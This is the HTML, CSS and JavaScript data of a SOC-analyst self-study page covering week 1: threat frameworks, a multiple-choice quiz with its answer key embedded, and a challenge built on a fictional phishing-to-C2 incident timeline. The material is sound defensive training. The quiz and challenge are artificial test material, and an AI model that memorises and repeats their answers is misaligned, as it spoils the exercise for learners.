<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SOC Analyst in 12 Weeks</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Condensed:wght@600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{
  /* layout: top bar, 940px column. dark navy hero panel anchors each page; work happens in a numbered step rail */
  --bg:#edf0f3; --surface:#ffffff; --ink:#14202b; --muted:#566777; --line:#d4dbe2;
  --accent:#0a6c8f; --accent-ink:#ffffff; --tint:#e2eff4;
  --hero:#0e2a3b; --hero-ink:#eaf3f7; --hero-muted:#9dbccb; --hero-accent:#6cc8ea;
  --good:#1b7548; --warn:#955600; --bad:#b3261e; --code:#f3f6f8;
  --g0:#e4e8ec; --g1:#f2e2a4; --g2:#e6c45c; --g3:#d4a017; --g4:#a67c00;
  --display:"IBM Plex Sans Condensed","Arial Narrow",system-ui,sans-serif;
  --body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
  --mono:"IBM Plex Mono",ui-monospace,Consolas,monospace;
  --shadow:0 1px 2px rgba(16,32,44,.06),0 4px 14px rgba(16,32,44,.05);
}
@media (prefers-color-scheme: dark){
  :root:not([data-theme="light"]){
    --bg:#0c1217; --surface:#151e26; --ink:#e4ebf1; --muted:#95a5b5; --line:#293541;
    --accent:#5bbbdd; --accent-ink:#06222d; --tint:#17303c;
    --hero:#12303f; --hero-ink:#eaf3f7; --hero-muted:#9dbccb; --hero-accent:#6cc8ea;
    --good:#5fc391; --warn:#e2a650; --bad:#f28b84; --code:#0f181f; --shadow:none; color-scheme:dark;
    --g0:#1e2933; --g1:#4a3b10; --g2:#806518; --g3:#bd931c; --g4:#f2c230;
  }
}
:root[data-theme="dark"]{
  --bg:#0c1217; --surface:#151e26; --ink:#e4ebf1; --muted:#95a5b5; --line:#293541;
  --accent:#5bbbdd; --accent-ink:#06222d; --tint:#17303c;
  --hero:#12303f; --hero-ink:#eaf3f7; --hero-muted:#9dbccb; --hero-accent:#6cc8ea;
  --good:#5fc391; --warn:#e2a650; --bad:#f28b84; --code:#0f181f; --shadow:none; color-scheme:dark;
    --g0:#1e2933; --g1:#4a3b10; --g2:#806518; --g3:#bd931c; --g4:#f2c230;
}
*{box-sizing:border-box}
html,body{margin:0}
body{background:var(--bg);color:var(--ink);font:16px/1.55 var(--body)}
a{color:var(--accent)}
h1,h2,h3{font-family:var(--display);font-weight:600;line-height:1.15;margin:0;text-wrap:balance}
h1{font-size:2.2rem} h2{font-size:1.4rem} h3{font-size:1.1rem}
h4{font:600 .78rem/1.2 var(--body);letter-spacing:.07em;text-transform:uppercase;color:var(--muted);margin:1.3em 0 .45em}
p{margin:.5em 0} ul{margin:.4em 0;padding-left:1.2em} li{margin:.25em 0}
code,pre{font-family:var(--mono);font-size:.84rem}
code{background:var(--code);padding:.08em .3em;border-radius:3px}
pre{background:var(--code);border:1px solid var(--line);border-radius:8px;padding:12px 14px;overflow-x:auto;margin:.6em 0;line-height:1.5;white-space:pre}
button,input{font:inherit;color:inherit}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

.bar{position:sticky;top:0;z-index:5;background:var(--surface);border-bottom:1px solid var(--line)}
.bar-in{max-width:1060px;margin:0 auto;padding:10px 20px;display:flex;gap:14px;align-items:center;flex-wrap:wrap}
.brand{font:600 1.05rem var(--display);letter-spacing:.02em;margin-right:auto;text-decoration:none;color:var(--ink);display:flex;align-items:center;gap:9px}
.brand svg{width:22px;height:22px;color:var(--accent)}
.brand span{color:var(--accent)}
nav{display:flex;gap:2px;flex-wrap:wrap}
nav a{padding:6px 9px;border-radius:6px;text-decoration:none;color:var(--muted);font-weight:500;font-size:.95rem}
nav a:hover{color:var(--ink)}
nav a[aria-current="page"]{background:var(--tint);color:var(--accent)}
.sub{background:var(--surface);border-bottom:1px solid var(--line)}
.sub nav{max-width:1060px;margin:0 auto;padding:6px 20px;gap:4px;overflow-x:auto;flex-wrap:nowrap}
.sub nav a{font-size:.88rem;padding:4px 10px;white-space:nowrap}
.sub nav a[aria-current="page"]{background:none;color:var(--ink);box-shadow:inset 0 -2px 0 var(--accent);border-radius:0}
.badge{display:inline-block;min-width:1.4em;padding:0 .4em;margin-left:5px;border-radius:9px;background:var(--warn);color:var(--surface);font-size:.75rem;text-align:center;font-weight:600}
.sync{font-size:.78rem;color:var(--muted);display:flex;align-items:center;gap:6px}
.sync i{width:8px;height:8px;border-radius:50%;background:var(--muted);display:inline-block}
.sync.cloud i{background:var(--good)} .sync.local i{background:var(--warn)}

main{max-width:980px;margin:0 auto;padding:24px 20px 80px;display:flex;flex-direction:column;gap:20px}
.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px 22px;box-shadow:var(--shadow)}
.card>h2{margin-bottom:10px}
.eyebrow{font:500 .78rem var(--mono);color:var(--muted);letter-spacing:.05em;text-transform:uppercase}
.lead{color:var(--muted);max-width:65ch}
.row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
.between{justify-content:space-between}

.hero{background:var(--hero) linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px) 0 0/100% 28px;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px),radial-gradient(120% 140% at 100% 0,rgba(108,200,234,.18),transparent 55%);background-size:28px 28px,28px 28px,100% 100%;color:var(--hero-ink);border-radius:14px;padding:26px 28px;display:grid;grid-template-columns:1fr auto;gap:24px;align-items:center;box-shadow:var(--shadow)}
.hero .eyebrow{color:var(--hero-accent)} .hero .eyebrow a{color:inherit}
.hero h1{margin:6px 0 8px}
.hero p{color:var(--hero-muted);max-width:58ch;margin:0}
.hero .row{margin-top:16px}
.hero .btn{background:var(--hero-accent);color:#06222d}
.hero .btn.ghost{background:transparent;color:var(--hero-ink);border-color:rgba(255,255,255,.28)}
.hero input[type=date]{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.28);border-radius:6px;padding:6px 8px;color:var(--hero-ink);color-scheme:dark}
.hero .sched{font-size:.9rem;color:var(--hero-muted)}
.ring{position:relative;width:128px;height:128px;flex:none}
.ring svg{width:100%;height:100%;transform:rotate(-90deg)}
.ring circle{fill:none;stroke-width:9}
.ring .t{stroke:rgba(255,255,255,.14)} .ring .v{stroke:var(--hero-accent);stroke-linecap:round}
.ring div{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;font:600 1.9rem var(--display);font-variant-numeric:tabular-nums}
.ring small{font:400 .72rem var(--body);color:var(--hero-muted)}
.pips{display:flex;gap:6px;flex-wrap:wrap;margin-top:14px}
.pip{font:500 .72rem var(--mono);padding:3px 9px;border-radius:20px;border:1px solid rgba(255,255,255,.25);color:var(--hero-muted);text-transform:uppercase;letter-spacing:.04em}
.pip.on{background:var(--hero-accent);border-color:var(--hero-accent);color:#06222d}
.pip.now{border-color:var(--hero-accent);color:var(--hero-accent)}
@media(max-width:640px){.hero{grid-template-columns:1fr;padding:22px}.ring{width:96px;height:96px}h1{font-size:1.8rem}}

.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
.stat{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px;box-shadow:var(--shadow)}
.stat b{display:block;font:600 1.6rem var(--display);font-variant-numeric:tabular-nums}
.stat span{font-size:.82rem;color:var(--muted)}
.stat.due b{color:var(--warn)}
.btn{background:var(--accent);color:var(--accent-ink);border:1px solid transparent;border-radius:7px;padding:9px 16px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block;line-height:1.3}
.btn.ghost{background:transparent;color:var(--accent);border-color:var(--line)}
.btn.small{padding:5px 11px;font-size:.85rem}
.btn:disabled{opacity:.5;cursor:not-allowed}
.chip{display:inline-block;font:500 .7rem var(--mono);padding:2px 8px;border-radius:4px;border:1px solid var(--line);color:var(--muted);text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
.chip.good{color:var(--good);border-color:var(--good)} .chip.warn{color:var(--warn);border-color:var(--warn)}
.chip.bad{color:var(--bad);border-color:var(--bad)} .chip.acc{color:var(--accent);border-color:var(--accent)}
.chip.fill{background:var(--tint);border-color:transparent;color:var(--accent)}
.meter{height:6px;background:var(--line);border-radius:3px;overflow:hidden;min-width:80px;flex:1}
.meter i{display:block;height:100%;background:var(--accent)}
.next{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:8px}
.next li{display:grid;grid-template-columns:28px 1fr auto;gap:12px;align-items:center;padding:11px 14px;border:1px solid var(--line);border-radius:9px;margin:0}
.next li b{width:26px;height:26px;border-radius:50%;background:var(--tint);color:var(--accent);display:grid;place-items:center;font:600 .85rem var(--mono)}
.next li:first-child{border-color:var(--accent)}
.strip{display:grid;grid-template-columns:repeat(12,1fr);gap:6px}
.strip a{display:block;text-align:center;padding:9px 0;border-radius:7px;border:1px solid var(--line);text-decoration:none;color:var(--muted);font:500 .85rem var(--mono);position:relative;overflow:hidden}
.strip a i{position:absolute;left:0;bottom:0;height:4px;background:var(--accent)}
.strip a.cur{border-color:var(--accent);color:var(--accent);box-shadow:0 0 0 1px var(--accent)} .strip a.done{background:var(--tint);color:var(--accent)}
.strip a.lock{opacity:.45}
@media(max-width:560px){.strip{grid-template-columns:repeat(6,1fr)}.next li{grid-template-columns:28px 1fr}.next li .btn{grid-column:2;justify-self:start}}

/* roadmap */
.path{display:flex;align-items:center;gap:0;overflow-x:auto;padding:4px 0}
.path a{flex:1;min-width:120px;text-decoration:none;color:var(--ink);padding:10px 12px;border:1px solid var(--line);background:var(--surface);border-radius:9px;font-size:.85rem}
.path a b{display:block;font:600 .95rem var(--display)} .path a small{color:var(--muted)}
.path a.done{border-color:var(--good)} .path a.now{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)} .path a.lock{opacity:.55}
.path span{flex:none;width:18px;height:2px;background:var(--line)}
.tl{position:relative;display:flex;flex-direction:column;gap:10px;padding-left:34px}
.tl::before{content:"";position:absolute;left:11px;top:6px;bottom:6px;width:2px;background:var(--line)}
.tl .node{position:relative}
.tl .node::before{content:"";position:absolute;left:-29px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--surface);border:2px solid var(--line)}
.tl .node.done::before{background:var(--good);border-color:var(--good)}
.tl .node.cur::before{background:var(--accent);border-color:var(--accent);box-shadow:0 0 0 4px var(--tint)}
.tl .stagehead{margin:14px 0 2px}
.tl .stagehead::before{left:-34px;top:6px;width:22px;height:22px;border-radius:6px;background:var(--hero);border:0;content:attr(data-n);color:var(--hero-ink);font:600 .8rem var(--mono);display:grid;place-items:center}
.stage-locked .wk{opacity:.55}
.wk{display:grid;grid-template-columns:1fr auto;gap:8px 16px;align-items:center;padding:14px 18px;background:var(--surface);border:1px solid var(--line);border-radius:10px;text-decoration:none;color:var(--ink);box-shadow:var(--shadow)}
.wk:hover{border-color:var(--accent)}
.wk small{color:var(--muted);display:block}
.wk.exam{border-style:dashed;box-shadow:none}
.wk .side{display:flex;gap:10px;align-items:center}
.mini{display:flex;gap:4px;margin-top:8px;flex-wrap:wrap}
.mini i{font:500 .66rem var(--mono);font-style:normal;padding:1px 7px;border-radius:10px;border:1px solid var(--line);color:var(--muted);text-transform:uppercase;letter-spacing:.03em}
.mini i.on{background:var(--tint);border-color:transparent;color:var(--accent)}
@media(max-width:560px){.wk{grid-template-columns:1fr}}

/* week steps */
.steps{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:12px;counter-reset:s}
.step{display:grid;grid-template-columns:40px 1fr;gap:14px;margin:0;position:relative}
.step::before{content:"";position:absolute;left:19px;top:44px;bottom:-12px;width:2px;background:var(--line)}
.step:last-child::before{display:none}
.step>.dot{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;font:600 1rem var(--mono);background:var(--surface);border:2px solid var(--line);color:var(--muted);z-index:1;margin-top:8px}
.step.cur>.dot{border-color:var(--accent);color:var(--accent);box-shadow:0 0 0 4px var(--tint)}
.step.done>.dot{background:var(--good);border-color:var(--good);color:var(--surface)}
.step.done::before{background:var(--good)}
.step>details{scroll-margin-top:70px;background:var(--surface);border:1px solid var(--line);border-radius:12px;box-shadow:var(--shadow);min-width:0}
.step.cur>details{border-color:var(--accent)}
.step>details>summary{list-style:none;cursor:pointer;padding:14px 18px;display:flex;gap:12px;align-items:center;justify-content:space-between}
.step>details>summary::-webkit-details-marker{display:none}
.step>details>summary h2{font-size:1.2rem}
.step>details>summary small{color:var(--muted);display:block;font-size:.85rem}
.step>details>summary .caret{flex:none;width:10px;height:10px;border-right:2px solid var(--muted);border-bottom:2px solid var(--muted);transform:rotate(45deg);margin:0 4px 4px 8px}
.step>details[open]>summary .caret{transform:rotate(-135deg);margin-bottom:-4px}
.step .body{padding:2px 18px 18px;border-top:1px solid var(--line);padding-top:14px}
@media(max-width:560px){.step{grid-template-columns:30px 1fr;gap:10px}.step>.dot{width:30px;height:30px;font-size:.85rem}.step::before{left:14px;top:38px}}

.tasks,.reslist{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
.tasks label{display:grid;grid-template-columns:22px 1fr auto;gap:10px;align-items:start;padding:10px 12px;border:1px solid var(--line);border-radius:8px;cursor:pointer}
.tasks input,.reslist input,.selfc input{width:18px;height:18px;margin-top:3px;accent-color:var(--accent)}
.tasks .done{color:var(--muted);text-decoration:line-through}
.reslist li{display:grid;grid-template-columns:22px 34px 1fr auto;gap:10px;align-items:start;padding:10px 12px;border:1px solid var(--line);border-radius:8px;margin:0}
.reslist li.core{border-left:3px solid var(--accent)}
.reslist a{font-weight:500;text-decoration:none;overflow-wrap:anywhere} .reslist a:hover{text-decoration:underline}
.reslist small{display:block;color:var(--muted)}
.reslist li.seen a{color:var(--muted)}
.ico{width:34px;height:34px;border-radius:8px;background:var(--tint);color:var(--accent);display:grid;place-items:center}
.ico svg{width:18px;height:18px}
.meta{display:flex;gap:6px;align-items:center;flex-wrap:wrap;justify-content:flex-end}
@media(max-width:560px){.reslist li{grid-template-columns:22px 1fr}.ico{display:none}.meta{grid-column:2;justify-content:flex-start}.tasks label{grid-template-columns:22px 1fr}.tasks label .chip{grid-column:2;justify-self:start}}
.selfc{display:grid;grid-template-columns:22px 1fr;gap:10px;padding:12px 14px;border:1px dashed var(--accent);border-radius:8px;cursor:pointer;margin-top:14px;background:var(--tint)}
.tasks .modhead{font:600 .76rem var(--body);letter-spacing:.07em;text-transform:uppercase;color:var(--muted);margin:10px 0 0;padding:0}
.tasks a{font-weight:500;text-decoration:none} .tasks a:hover{text-decoration:underline}
.tasks .done a{color:var(--muted)}
.today-rooms{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:8px}
.today-rooms li{display:grid;grid-template-columns:1fr auto;gap:12px;align-items:center;padding:12px 14px;border:1px solid var(--line);border-left:3px solid var(--g3);border-radius:9px;margin:0}
.today-rooms small{display:block;color:var(--muted)}
.note{border-left:3px solid var(--accent);background:var(--tint);padding:10px 14px;border-radius:0 6px 6px 0;font-size:.95rem}
.lesson{max-width:70ch}
.opts{display:flex;flex-direction:column;gap:8px;margin:14px 0}
.opt{text-align:left;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:11px 14px;cursor:pointer;overflow-wrap:anywhere}
.opt:hover:not(:disabled){border-color:var(--accent)}
.opt.right{border-color:var(--good);background:color-mix(in srgb,var(--good) 12%,var(--surface))}
.opt.wrong{border-color:var(--bad);background:color-mix(in srgb,var(--bad) 12%,var(--surface))}
.why{font-size:.95rem;color:var(--muted);margin:8px 0 14px}
.qtext{font-weight:500;font-size:1.05rem;overflow-wrap:anywhere}
.cq{display:grid;grid-template-columns:1fr;gap:6px;padding:12px 0;border-top:1px solid var(--line)}
.cq .in{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.cq input{flex:1;min-width:180px;padding:8px 10px;border:1px solid var(--line);border-radius:6px;background:var(--bg);font-family:var(--mono);font-size:.9rem}
.cq.ok input{border-color:var(--good)} .cq.no input{border-color:var(--bad)}
.hint{font-size:.8rem;color:var(--muted)}
.ev{position:relative}
.ev .btn{position:absolute;top:8px;right:8px;background:var(--surface)}
.ev pre{padding-top:42px;max-height:420px;overflow:auto}
.timer{position:sticky;top:58px;z-index:4;background:var(--surface);border:1px solid var(--accent);border-radius:8px;padding:8px 14px;display:flex;justify-content:space-between;align-items:center;font-family:var(--mono)}
.eq{padding:16px 0;border-top:1px solid var(--line)}
.eq label{display:flex;gap:10px;padding:7px 10px;border-radius:6px;cursor:pointer;align-items:flex-start;overflow-wrap:anywhere}
.eq label:hover{background:var(--tint)}
.eq input{margin-top:5px;accent-color:var(--accent)}
.eq .r{color:var(--good);font-weight:600} .eq .w{color:var(--bad);text-decoration:line-through}
.big{font:600 3rem var(--display);font-variant-numeric:tabular-nums;margin:0}
.boxes{display:flex;gap:8px;align-items:flex-end;height:96px}
.boxes div{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;gap:4px;font:500 .75rem var(--mono);color:var(--muted);height:100%;text-align:center}
.boxes i{display:block;width:100%;background:var(--accent);border-radius:3px 3px 0 0;min-height:2px}
.lib h3{margin:18px 0 8px}
.filters{display:flex;gap:6px;flex-wrap:wrap}
.filters button{background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:5px 13px;cursor:pointer;font-size:.88rem;color:var(--muted)}
.filters button[aria-pressed="true"]{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
main.wide{max-width:1200px}
.wkgrid{display:grid;grid-template-columns:minmax(0,1fr);gap:20px}
.aside{display:none}
@media(min-width:1060px){.wkgrid{grid-template-columns:minmax(0,1fr) 260px;align-items:start}.aside{display:flex;flex-direction:column;gap:14px;position:sticky;top:74px}}
.snav{list-style:none;margin:10px 0 14px;padding:0;display:flex;flex-direction:column;gap:4px}
.snav li{margin:0}
.snav button{width:100%;display:grid;grid-template-columns:26px 1fr;gap:10px;align-items:center;text-align:left;background:none;border:1px solid transparent;border-radius:8px;padding:7px 8px;cursor:pointer}
.snav button:hover{background:var(--tint)}
.snav b{width:24px;height:24px;border-radius:50%;border:2px solid var(--line);display:grid;place-items:center;font:600 .75rem var(--mono);color:var(--muted)}
.snav .done b{background:var(--good);border-color:var(--good);color:var(--surface)}
.snav .cur b{border-color:var(--accent);color:var(--accent)} .snav .cur button{border-color:var(--line)}
.snav small{display:block;color:var(--muted);font-size:.78rem}
.kv{display:grid;grid-template-columns:1fr auto;gap:4px 10px;font-size:.9rem;margin-top:8px} .kv span{color:var(--muted)} .kv b{font-variant-numeric:tabular-nums}
.two{display:grid;grid-template-columns:minmax(0,1fr);gap:20px}
@media(min-width:900px){.two{grid-template-columns:minmax(0,1.7fr) minmax(0,1fr);align-items:start}}
.ivq{display:flex;flex-direction:column;gap:6px}
.ivq details{border:1px solid var(--line);border-radius:8px;padding:10px 14px}
.ivq summary{cursor:pointer;font-weight:500}
.ivq p{color:var(--muted);margin:.6em 0 .2em;max-width:68ch}
.sheet{display:grid;grid-template-columns:minmax(0,1fr);gap:4px 20px}
@media(min-width:900px){.sheet{grid-template-columns:repeat(2,minmax(0,1fr))}}
.sheet>div{min-width:0}
.themebtn{background:none;border:1px solid var(--line);border-radius:7px;width:34px;height:34px;display:grid;place-items:center;cursor:pointer;color:var(--muted)}
.themebtn svg{width:16px;height:16px}
@media print{.bar,footer,.filters,.btn{display:none!important}body{background:#fff}.card{box-shadow:none;break-inside:avoid}}
.cal{overflow-x:auto;padding-bottom:4px}
.calgrid{display:grid;grid-template-columns:28px auto;gap:4px 6px;width:max-content}
.months{grid-column:2;display:grid;grid-auto-flow:column;grid-auto-columns:15px;gap:3px;font:500 .68rem var(--mono);color:var(--muted);height:14px}
.months span{white-space:nowrap;overflow:visible}
.days{display:grid;grid-template-rows:repeat(7,15px);gap:3px;font:500 .66rem var(--mono);color:var(--muted);line-height:15px}
.cells{display:grid;grid-auto-flow:column;grid-template-rows:repeat(7,15px);grid-auto-columns:15px;gap:3px}
.cells i{border-radius:3px;background:var(--g0)}
.cells i.l1{background:var(--g1)} .cells i.l2{background:var(--g2)} .cells i.l3{background:var(--g3)} .cells i.l4{background:var(--g4)}
.cells i.today{outline:2px solid var(--ink);outline-offset:1px}
.cells i.fut{background:transparent}
.legend{display:flex;gap:4px;align-items:center;font-size:.78rem;color:var(--muted)}
.legend i{width:13px;height:13px;border-radius:3px;display:inline-block}
.simgrid{display:grid;grid-template-columns:minmax(0,1fr);gap:16px}
@media(min-width:900px){.simgrid{grid-template-columns:330px minmax(0,1fr);align-items:start}}
.queue{display:flex;flex-direction:column;gap:6px}
.qa{text-align:left;background:var(--surface);border:1px solid var(--line);border-radius:9px;padding:10px 12px;cursor:pointer;display:flex;flex-direction:column;gap:4px;color:var(--ink)}
.qa:hover{border-color:var(--accent)} .qa.sel{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)} .qa.done{opacity:.6}
.qa small{color:var(--muted);font-size:.78rem}
.sev-critical{color:var(--bad);border-color:var(--bad);background:color-mix(in srgb,var(--bad) 12%,transparent)} .sev-high{color:var(--warn);border-color:var(--warn)} .sev-medium{color:var(--accent);border-color:var(--accent)}
.ta{width:100%;padding:10px 12px;border:1px solid var(--line);border-radius:8px;background:var(--bg);font:inherit;font-size:.95rem;line-height:1.5;resize:vertical;color:var(--ink)}
.fb{margin-top:12px;border:1px solid var(--line);border-radius:8px;padding:4px 14px 10px}
.ivq details.model{border:0;padding:6px 0 0}
.ivq details.model summary{font-weight:400;color:var(--accent);font-size:.9rem}
.timerbtn{background:none;border:1px solid var(--line);border-radius:7px;padding:6px 11px;cursor:pointer;font:500 .82rem var(--mono);color:var(--ink);white-space:nowrap}
.timerbtn.on{background:var(--g3);border-color:var(--g3);color:#1c1400}
.plan{display:flex;flex-direction:column;gap:6px}
.planrow{display:grid;grid-template-columns:minmax(0,1fr) auto auto;gap:8px;align-items:center}
.planrow small{display:block;color:var(--muted);font-size:.8rem}
.planrow select,.planrow input{padding:6px 8px;border:1px solid var(--line);border-radius:6px;background:var(--bg);color:var(--ink);font-size:.88rem}
@media(max-width:560px){.planrow{grid-template-columns:1fr 1fr}.planrow span{grid-column:1/-1}}
.daybars{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;align-items:end;height:160px}
.daybars div{display:flex;flex-direction:column;align-items:center;justify-content:flex-end;gap:5px;height:100%;font:500 .72rem var(--mono);color:var(--muted)}
.daybars i{display:block;width:70%;background:var(--g3);border-radius:4px 4px 0 0}
.daybars i.act{background:var(--g1)} .daybars i.none{background:var(--line)}
.skilltable{display:flex;flex-direction:column}
.skillrow{display:grid;grid-template-columns:minmax(0,1.3fr) minmax(0,1fr) auto;gap:16px;align-items:center;padding:12px 0;border-top:1px solid var(--line)}
.skillrow:first-child{border-top:0}
.skillrow small{display:block;color:var(--muted);font-size:.82rem}
.bars{display:flex;flex-direction:column;gap:4px}
.bars span{display:block;height:6px;background:var(--line);border-radius:3px;overflow:hidden}
.bars i{display:block;height:100%;background:var(--accent)}
.bars span:nth-child(2) i{background:var(--g3)} .bars span:nth-child(3) i{background:var(--good)}
.skillrow .sc{display:flex;gap:10px;align-items:center;justify-content:flex-end}
.skillrow .sc b{font:600 1.5rem var(--display);font-variant-numeric:tabular-nums}
@media(max-width:640px){.skillrow{grid-template-columns:1fr}.skillrow .sc{justify-content:flex-start}}
.livedot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--muted);margin-right:7px;vertical-align:baseline}
.livedot.on{background:var(--good);box-shadow:0 0 0 3px color-mix(in srgb,var(--good) 25%,transparent)}
.livenote{border-left-color:var(--g3);margin:10px 0}
.syncbox{margin-top:10px;border-top:1px solid var(--line);padding-top:10px}
.syncbox summary{cursor:pointer;font-weight:500;color:var(--accent)}
.codein{flex:1;min-width:200px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;background:var(--bg);font-family:var(--mono);font-size:.85rem}
footer{font-size:.82rem;color:var(--muted);display:flex;gap:12px;justify-content:space-between;flex-wrap:wrap;align-items:center}
@media (prefers-reduced-motion:no-preference){.meter i,.strip a i{transition:width .3s}.ring .v{transition:stroke-dashoffset .5s}}

try { const t = localStorage.getItem('soc12-theme'); if (t) document.documentElement.dataset.theme = t; } catch (e) {}
const D = {"weeks":[{"title":"How a SOC thinks","module":"Frameworks and the analyst mindset","goal":"Describe any attack in the shared language of the Kill Chain, MITRE ATT&CK and the Pyramid of Pain.","tasks":[["room","Junior Security Analyst Intro",1,"jrsecanalystintrouxo","Blue Team Introduction"],["room","SOC Role in Blue Team",1,"socroleinblueteam","Blue Team Introduction"],["room","Humans as Attack Vectors",1,"humansattackvectors","Blue Team Introduction"],["room","Systems as Attack Vectors",1,"systemsattackvectors","Blue Team Introduction"],["room","Pyramid Of Pain",1,"pyramidofpainax","Cyber Defence Frameworks"],["room","Cyber Kill Chain",1,"cyberkillchainzmt","Cyber Defence Frameworks"],["room","Unified Kill Chain",1,"unifiedkillchain","Cyber Defence Frameworks"],["room","MITRE",1,"mitre","Cyber Defence Frameworks"],["room","Summit",1,"summit","Cyber Defence Frameworks"],["room","Eviction",1,"eviction","Cyber Defence Frameworks"],["own","Pick one public breach write-up and map 5 of its steps to ATT&CK technique IDs at attack.mitre.org",1]],"note":"Rooms you already finished on TryHackMe are ticked automatically from your public profile, so this week is mostly done. Finish what is left and move straight to the quiz. Time you save here is your buffer for later weeks.","lesson":"\u003cp>Every alert you will ever triage is one step of a longer story. Frameworks give you the vocabulary to say which step, so a colleague or a report reader understands in one line.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>Cyber Kill Chain\u003c/b>, 7 phases in order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.\u003c/li>\n\u003cli>\u003cb>MITRE ATT&amp;CK\u003c/b>: a \u003ci>tactic\u003c/i> is the attacker's goal (Persistence), a \u003ci>technique\u003c/i> is how (T1053 Scheduled Task), a sub-technique is the exact variant (T1053.005).\u003c/li>\n\u003cli>\u003cb>Pyramid of Pain\u003c/b>, bottom to top: Hash values, IP addresses, Domain names, Network/Host artifacts, Tools, TTPs. The higher you detect, the more it costs the attacker to adapt.\u003c/li>\n\u003cli>\u003cb>Alert outcomes\u003c/b>: true positive (real attack, alert fired), false positive (benign, alert fired), false negative (real attack, no alert).\u003c/li>\n\u003cli>\u003cb>L1 job\u003c/b>: take ownership, gather context, decide TP or FP, document, escalate what is outside your scope.\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>Mixing up tactic and technique. Test yourself: \"Phishing\" is a technique (T1566); the tactic it serves is Initial Access.\u003c/p>\n\u003ch4>Say it out loud\u003c/h4>\u003cp>Without notes, explain to an imaginary interviewer why blocking a file hash is weaker than detecting a behaviour.\u003c/p>","quiz":[{"q":"Which level of the Pyramid of Pain is hardest for an attacker to change?","o":["Hash values","Domain names","Tools","TTPs"],"a":3,"why":"TTPs are the attacker's habits and methods. Changing them means retraining and re-engineering the whole operation."},{"q":"In the Cyber Kill Chain, which phase comes directly after Delivery?","o":["Installation","Exploitation","Weaponization","Command and Control"],"a":1,"why":"Order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives."},{"q":"In MITRE ATT&CK, what does a tactic describe?","o":["The exact command the attacker ran","The attacker's goal at that step","The malware family used","The vulnerability exploited"],"a":1,"why":"Tactic = why (goal). Technique = how."},{"q":"An attacker stole data for a week and no alert ever fired. What is this called?","o":["False positive","True negative","False negative","True positive"],"a":2,"why":"Malicious activity happened and detection missed it: false negative, the most dangerous outcome."},{"q":"A new alert appears in the queue. What should an L1 analyst do first?","o":["Close it if the severity is low","Take ownership and review who, what host and when","Immediately isolate the host","Escalate to L2 without reading it"],"a":1,"why":"Ownership and context come first. Verdict and action follow from evidence."},{"q":"Which detection is easiest for an attacker to bypass?","o":["Rule on a file hash","Rule on a parent-child process pattern","Rule on beaconing behaviour","Rule on abnormal logon patterns"],"a":0,"why":"Recompiling or changing one byte gives a new hash. Behavioural detections survive that."},{"q":"When should an L1 analyst escalate to L2?","o":["Whenever an alert has high severity, before investigating","When a true positive needs action or analysis beyond L1 scope","Only when a manager asks","Never; L1 closes all alerts"],"a":1,"why":"Escalate confirmed or likely incidents that need deeper investigation or remediation you are not authorised to perform."}],"chal":{"title":"Map an intrusion to the frameworks","brief":"Read the timeline and answer in framework terms. Use attack.mitre.org if you need it; that is what analysts do.","evidence":"# Incident timeline, finance workstation FIN-PC-07, 2026-11-09\n09:02  User receives email \"Invoice Q4\" with attachment Invoice_Q4.docm from billing@acme-invoices.example\n09:05  User opens the document and enables macros. The macro starts powershell.exe\n09:05  powershell.exe downloads upd.exe from 185.220.101.47\n09:06  upd.exe creates a scheduled task \"OneDriveSync\" that runs upd.exe at every logon\n09:10  upd.exe connects to 185.220.101.47:443 every 60 seconds and waits for instructions","qs":[{"p":"ATT&CK technique ID (with sub-technique) for how the attacker got in at 09:02","h":["1tsi92022yi"],"hint":"Format T####.###"},{"p":"ATT&CK tactic served by the scheduled task at 09:06","h":["108vu694nti"],"hint":"One word"},{"p":"Cyber Kill Chain phase of the 09:10 activity","h":["2jw8o7g1vh","u13ov5fspq","1h8mn16rwvl","11wp1kydh4s","31f8j3bmac"],"hint":""},{"p":"You block 185.220.101.47 on the firewall. Which Pyramid of Pain level is that?","h":["1f4mo3nth6n","1af045jw1qy","1pf5cwevapw","9rpwkqag2x"],"hint":""}]},"iv":[["Walk me through what you do when a new alert lands in your queue.","I assign it to myself, read 